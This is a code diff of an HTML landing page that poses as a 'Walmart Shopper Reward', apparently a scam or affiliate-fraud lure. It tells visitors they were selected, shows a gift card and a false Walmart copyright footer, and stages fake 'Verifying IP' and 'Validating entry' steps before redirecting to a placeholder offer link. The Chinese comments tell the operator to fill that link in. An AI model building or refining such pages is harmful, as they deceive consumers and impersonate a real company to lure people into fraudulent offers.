@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Walmart Rewards</title>
+    <title>Walmart Shopper Reward</title>
     <style>
+        /* 基础样式 */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
         body { background-color: #f0f2f5; display: flex; justify-content: center; padding: 10px; }
 
@@ -18,41 +19,41 @@
             text-align: center;
         }
 
-        /* 顶部紧凑区 */
+        /* 顶部紧凑区域 */
         .header {
             background-color: #0071ce;
             color: white;
             padding: 12px;
         }
-        .header h1 { font-size: 16px; text-transform: uppercase; letter-spacing: 1px; }
-        .header .amount { font-size: 32px; font-weight: 800; }
+        .header h1 { font-size: 15px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 2px; }
+        .header .amount { font-size: 30px; font-weight: 800; }
 
-        .content { padding: 15px; }
-        h2 { color: #333; font-size: 20px; margin-bottom: 8px; }
+        .content { padding: 20px 15px; }
+        h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
 
-        /* 图片样式 */
+        /* 礼品卡图片样式 */
         .prize-img {
             width: 85%;
             border-radius: 10px;
             margin: 5px 0 15px 0;
-            box-shadow: 0 5px 15px rgba(0,113,206,0.2);
+            box-shadow: 0 5px 15px rgba(0,113,206,0.15);
         }
 
         .text-info { font-size: 14px; color: #555; margin-bottom: 20px; line-height: 1.4; }
 
-        /* 呼吸灯按钮样式 */
+        /* 呼吸灯动画 */
         @keyframes pulse {
             0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+            50% { transform: scale(1.04); }
             100% { transform: scale(1); }
         }
 
+        /* 按钮初始状态 */
         .claim-btn {
             display: block;
             width: 100%;
             background: linear-gradient(180deg, #ffc220 0%, #fdb900 100%);
             color: #000;
-            text-decoration: none;
             font-weight: bold;
             font-size: 20px;
             padding: 16px;
@@ -61,32 +62,28 @@
             cursor: pointer;
             box-shadow: 0 4px 0 #b38400;
             animation: pulse 1.5s infinite ease-in-out;
+            transition: all 0.2s ease;
+            outline: none;
         }
 
-        /* 加载遮罩层 */
-        #overlay {
+        /* 按钮点击后的处理中状态 */
+        .claim-btn.processing {
+            background: #e0e0e0 !important;
+            color: #777 !important;
+            box-shadow: none !important;
+            transform: translateY(2px);
+            animation: none !important;
+            cursor: not-allowed;
+        }
+
+        .loading-hint {
             display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.95);
-            z-index: 1000;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
         }
 
-        .loader {
-            border: 6px solid #f3f3f3;
-            border-top: 6px solid #0071ce;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        #status-text { margin-top: 20px; font-weight: bold; color: #0071ce; font-size: 18px; }
+        .footer { font-size: 10px; color: #ccc; margin-top: 20px; padding-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -99,35 +96,46 @@
 
         <div class="content">
             <h2>Congratulations!</h2>
-            <img src="walmart-card-hero.webp" alt="Gift Card" class="prize-img">
+            <img src="walmart-card-hero.webp" alt="Walmart Gift Card" class="prize-img">
             
             <p class="text-info">
-                You've been selected to participate in our 2026 loyalty program.<br>
-                <strong>Complete the survey to claim your $1,000 card.</strong>
+                You've been selected to participate.<br>
+                <strong>Complete the survey to claim your card.</strong>
             </p>
 
-            <button class="claim-btn" onclick="startLoading()">CLAIM NOW</button>
+            <button class="claim-btn" id="claimBtn" onclick="startProcess()">CLAIM NOW</button>
+            <p id="loadingHint" class="loading-hint">Processing request, please do not close...</p>
+        </div>
+
+        <div class="footer">
+            © 2026 Walmart Loyalty Program. US Only.
         </div>
     </div>
 
-    <div id="overlay">
-        <div class="loader"></div>
-        <div id="status-text">Verifying your IP...</div>
-    </div>
-
     <script>
-        function startLoading() {
-            const overlay = document.getElementById('overlay');
-            const statusText = document.getElementById('status-text');
-            const finalUrl = "你的新OFFER链接地址"; // <-- 在这里填入你的链接
+        function startProcess() {
+            const btn = document.getElementById('claimBtn');
+            const hint = document.getElementById('loadingHint');
+            // 此处替换为你真实的 Walmart Offer 链接
+            const finalUrl = "你的新OFFER链接地址"; 
 
-            overlay.style.display = 'flex';
+            // 1. 改变按钮状态
+            btn.classList.add('processing');
+            hint.style.display = 'block';
+            
+            // 2. 依次切换按钮内文案
+            btn.innerHTML = "Verifying IP...";
 
-            // 模拟验证步骤
-            setTimeout(() => { statusText.innerText = "Checking availability..."; }, 1000);
-            setTimeout(() => { statusText.innerText = "Validating entry..."; }, 2000);
             setTimeout(() => {
-                // 最终跳转
+                btn.innerHTML = "Checking availability...";
+            }, 1500);
+
+            setTimeout(() => {
+                btn.innerHTML = "Validating entry...";
+            }, 1500);
+
+            // 3. 3秒后执行跳转
+            setTimeout(() => {
                 window.location.href = finalUrl;
             }, 3000);
         }
